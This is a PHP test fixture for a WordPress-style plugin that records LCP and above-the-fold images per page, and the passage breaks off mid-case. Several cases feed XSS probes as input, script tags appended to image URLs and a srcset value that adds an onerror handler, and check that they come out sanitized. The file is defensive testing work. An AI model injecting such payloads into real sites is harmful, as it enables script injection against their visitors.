<?php

$long_array = [
	(object) [
		'type' => 'img',
		'label' => 'lcp',
		'src'   => 'http://example.org/lcp.jpg',
	],
];
$long_array_2 = [
	(object) [
		'type' => 'img',
		'src'   => 'http://example.org/lcp.jpg',
	],
];
for ( $i = 1; $i <= 50; $i++ ) {
	$long_array[] = (object) [
		'label' => 'above-the-fold',
		'type'  => 'img',
		'src'   => 'http://example.org/above-the-fold-' . $i . '.jpg',
	];
	$long_array_2[] = (object) [
		'type' => 'img',
		'src'   => 'http://example.org/above-the-fold-' . $i . '.jpg',
	];
}

$mime_types = [
	'jpg|jpeg|jpe' => 'image/jpeg',
	'gif'          => 'image/gif',
	'png'          => 'image/png',
	'bmp'          => 'image/bmp',
	'tiff|tif'     => 'image/tiff',
	'webp'         => 'image/webp',
	'avif'         => 'image/avif',
	'ico'          => 'image/x-icon',
	'heic'         => 'image/heic',
	'heif'         => 'image/heif',
	'heics'        => 'image/heic-sequence',
	'heifs'        => 'image/heif-sequence',
	'asf|asx'      => 'video/x-ms-asf',
];

return [
	'testShouldBailWhenNotAllowed' => [
		'config'   => [
			'filter'    => false,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode( [] ),
			'results' => json_encode(
				[
					'lcp' => []
				],
			),
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => [],
				'viewport'      => [],
				'last_accessed' => '2024-01-01 00:00:00',
			],
			'result'  => false,
			'message' => 'not allowed',
		],
	],
	'testShouldBailoutWhenDBError' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'type'  => 'img',
						'label' => 'lcp',
						'src'   => 'http://example.org/lcp.jpg',
					],
					(object) [
						'type'  => 'img',
						'label' => 'above-the-fold',
						'src'   => 'http://example.org/above-the-fold.jpg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'type'  => 'img',
							'label' => 'lcp',
							'src'   => 'http://example.org/lcp.jpg',
						],
						(object) [
							'type'  => 'img',
							'label' => 'above-the-fold',
							'src'   => 'http://example.org/above-the-fold.jpg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'jpg',
				'type' => 'image/jpeg',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/lcp.jpg',
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpg',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => false,
			'message' => 'error when adding the entry to the database',
		],
	],
	'testShouldAddItemToDB' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'img',
						'src'   => 'http://example.org/lcp.jpg',
					],
					(object) [
						'label' => 'above-the-fold',
						'type'  => 'img',
						'src'   => 'http://example.org/above-the-fold.jpg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'img',
							'src'   => 'http://example.org/lcp.jpg',
						],
						(object) [
							'label' => 'above-the-fold',
							'type'  => 'img',
							'src'   => 'http://example.org/above-the-fold.jpg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'jpg',
				'type' => 'image/jpeg',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/lcp.jpg',
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpg',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/lcp.jpg',
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpg',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldAddItemToDBWhenMobile' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => true,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'img',
						'src'   => 'http://example.org/lcp.jpg',
					],
					(object) [
						'label' => 'above-the-fold',
						'type'  => 'img',
						'src'   => 'http://example.org/above-the-fold.jpg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'img',
							'src'   => 'http://example.org/lcp.jpg',
						],
						(object) [
							'label' => 'above-the-fold',
							'type'  => 'img',
							'src'   => 'http://example.org/above-the-fold.jpg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'jpg',
				'type' => 'image/jpeg',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => true,
				'status'        => 'completed',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/lcp.jpg',
					],
				),
				'viewport'      => json_encode(
					[
						(object) [
							'type' => 'img',
							'src'  => 'http://example.org/above-the-fold.jpg',
						],
					],
				),
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => true,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/lcp.jpg',
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpg',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldSanitizeLCPAndATF' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'img',
						'src'   => 'http://example.org/lcp.jpg<script>alert("Test XSS");</script>',
					],
					(object) [
						'label' => 'above-the-fold',
						'type'  => 'img',
						'src'   => 'http://example.org/above-the-fold.jpg<script>alert("Test XSS");</script>',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'img',
							'src'   => 'http://example.org/lcp.jpg<script>alert("Test XSS");</script>',
						],
						(object) [
							'label' => 'above-the-fold',
							'type'  => 'img',
							'src'   => 'http://example.org/above-the-fold.jpg<script>alert("Test XSS");</script>',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'jpg',
				'type' => 'image/jpeg',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'images_valid_sources' => [
				'http://example.org/lcp.jpg<script>alert("Test XSS");</script>' => 'http://example.org/lcp.jpgscriptalert(Test%20XSS);/script',
				'http://example.org/above-the-fold.jpg<script>alert("Test XSS");</script>' => 'http://example.org/above-the-fold.jpgscriptalert(Test%20XSS);/script'
			],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/lcp.jpgscriptalert(Test%20XSS);/script',
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpgscriptalert(Test%20XSS);/script',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/lcp.jpgscriptalert(Test%20XSS);/script',
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpgscriptalert(Test%20XSS);/script',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldSanitizeArrayLCPAndATF' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'bg-img',
						'src'   => '',
						'bg_set' => [
							[
								'src' => 'http://example.org/anotherlcp.jpg'
							],
							[
								'src' => 'http://example.org/anotherlcp2.jpg'
							]
						]
					],
					(object) [
						'label' => 'above-the-fold',
						'type'  => 'img',
						'src'   => 'http://example.org/above-the-fold.jpg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'bg-img',
							'src'   => '',
							'bg_set' => [
								[
									'src' => 'http://example.org/anotherlcp.jpg'
								],
								[
									'src' => 'http://example.org/anotherlcp2.jpg'
								]
							]
						],
						(object) [
							'label' => 'above-the-fold',
							'type'  => 'img',
							'src'   => 'http://example.org/above-the-fold.jpg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'jpg',
				'type' => 'image/jpeg',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'images_valid_sources' => [
			],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => json_encode(
					(object) [
						'type' => 'bg-img',
						'bg_set' => [
							[
								'src'  => 'http://example.org/anotherlcp.jpg'
							],
							[
								'src'  => 'http://example.org/anotherlcp2.jpg'
							],
						],
						'src'  => ''
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpg',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => json_encode(
					(object) [
						'type' => 'bg-img',
						'bg_set' => [
							[
								'src'  => 'http://example.org/anotherlcp.jpg'
							],
							[
								'src'  => 'http://example.org/anotherlcp2.jpg'
							],
						],
						'src'  => ''
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpg',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldSanitizeImageSrcWithLCPAndATFArray' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'bg-img-set',
						'src'   => [
							[
								'src' => 'http://example.org/lcp.jpg'
							],
							[
								'src' => 'http://example.org/random.jpg'
							]
						],
						'bg_set' => [
							[
								'src' => 'http://example.org/anotherlcp.jpg'
							],
							[
								'src' => 'http://example.org/anotherlcp2.jpg'
							]
						]
					],
					(object) [
						'label' => 'above-the-fold',
						'type'  => 'img',
						'src'   => 'http://example.org/above-the-fold.jpg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'bg-img-set',
							'src'   => [
								[
									'src' => 'http://example.org/lcp.jpg'
								],
								[
									'src' => 'http://example.org/random.jpg'
								]
							],
							'bg_set' => [
								[
									'src' => 'http://example.org/anotherlcp.jpg'
								],
								[
									'src' => 'http://example.org/anotherlcp2.jpg'
								]
							]
						],
						(object) [
							'label' => 'above-the-fold',
							'type'  => 'img',
							'src'   => 'http://example.org/above-the-fold.jpg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'jpg',
				'type' => 'image/jpeg',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => json_encode(
					(object) [
						'type' => 'bg-img-set',
						'bg_set' => [
							[
								'src'  => 'http://example.org/anotherlcp.jpg'
							],
							[
								'src'  => 'http://example.org/anotherlcp2.jpg'
							],
						],
						'src'   => ''
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpg',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => json_encode(
					(object) [
						'type' => 'bg-img-set',
						'bg_set' => [
							[
								'src'  => 'http://example.org/anotherlcp.jpg'
							],
							[
								'src'  => 'http://example.org/anotherlcp2.jpg'
							],
						],
						'src'   => ''
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpg',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldAddLongItemToDB' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				$long_array
			),
			'results' => json_encode(
				[
					'lcp' => $long_array,
				],
			),
			'filetype' => [
				'ext' => 'jpg',
				'type' => 'image/jpeg',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => json_encode( $long_array_2[0] ),
				'viewport'      => json_encode( array_slice( $long_array_2, 1, 20 ) ),
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => json_encode( $long_array_2[0] ),
				'viewport'      => json_encode( array_slice( $long_array_2, 1, 20 ) ),
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldNotAddItemToDBWhenNoData' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => '',
			'results' => json_encode(
				[
					'lcp' => []
				],
			),
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldReturnNotFound' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'src'   => "",
						'bg_set' => [],
						'type' => ''
					],
					(object) [
						'label' => 'above-the-fold',
						'type'  => '',
						'src'   => '',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'src'   => "",
							'bg_set' => [],
							'type' => ''
						],
						(object) [
							'label' => 'above-the-fold',
							'type'  => '',
							'src'   => '',
						],
					]
				],
			),
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],

	'testShouldAddItemToDBWhenScriptError' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => '',
			'results' => json_encode(
				[
					'lcp' => []
				],
			),
			'status'    => 'script_error',
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'failed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => 'Script error',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'failed',
				'error_message' => 'Script error',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldAddItemToDBWhenScriptTimeout' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => '',
			'results' => json_encode(
				[
					'lcp' => []
				],
			),
			'status'    => 'timeout',
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'failed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => 'Script timeout',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'failed',
				'error_message' => 'Script timeout',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],

	'testShouldBailoutWithNotValidImages1' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'img',
						'src'   => 'http://example.org/file.php?url=img.jpg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'img',
							'src'   => 'http://example.org/file.php?url=img.jpg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'php',
				'type' => false,
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldBailoutWithNotValidImages2' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'img',
						'src'   => 'http://example.org/file.js?url=img.jpg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'img',
							'src'   => 'http://example.org/file.js?url=img.jpg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'js',
				'type' => 'application/javascript',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldBailoutWithNotValidImages3' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'img',
						'src'   => 'http://example.org/file.php#url=img.jpg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'img',
							'src'   => 'http://example.org/file.php#url=img.jpg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'php',
				'type' => 'application/php',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldBailoutWithNotValidImages4' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'img',
						'src'   => 'chrome-extension://extension-hash/path/to/image/x.svg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'img',
							'src'   => 'chrome-extension://extension-hash/path/to/image/x.svg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'svg',
				'type' => 'image/svg+xml',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldBailoutWithNotValidImages5' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'bg-img',
						'src'   => 'linear-gradient(160deg, rgb(255, 255, 255) 0%, rgb(248, 246, 243) 100%)',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'bg-img',
							'src'   => 'linear-gradient(160deg, rgb(255, 255, 255) 0%, rgb(248, 246, 243) 100%)',
						],
					]
				],
			),
			'filetype' => [
				'ext' => false,
				'type' => false,
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldAddItemToDBWhenSvgWithHttpProtocol' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'img',
						'src'   => 'http://example.org/path/to/images/image.svg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'img',
							'src'   => 'http://example.org/path/to/images/image.svg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'svg',
				'type' => 'image/svg+xml',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/path/to/images/image.svg',
					],
				),
				'viewport' 		=> '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/path/to/images/image.svg',
					],
				),
				'viewport' 		=> '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],

	// ========================================================================
	// XSS VULNERABILITY TEST CASES - Picture Sources
	// ========================================================================

	/**
	 * Test Case: XSS attempt via srcset with onerror event handler
	 * Should sanitize/reject malicious srcset containing event handlers
	 */
	'testXSSInSrcsetOnerror' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode([
				'lcp' => [
					[
						'type'    => 'picture',
						'src'     => 'http://example.org/wp-content/uploads/image.jpg',
						'srcset'  => '',
						'sizes'   => '',
						'sources' => [
							[
								'srcset' => 'image.avif" onerror="alert(document.domain)',
								'media'  => '',
								'type'   => 'image/avif',
								'sizes'  => '',
							],
						],
						'label'   => 'lcp',
					],
				],
			]),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext' => 'avif',
				'type' => 'image/avif',
			],
		],
		'expected' => [
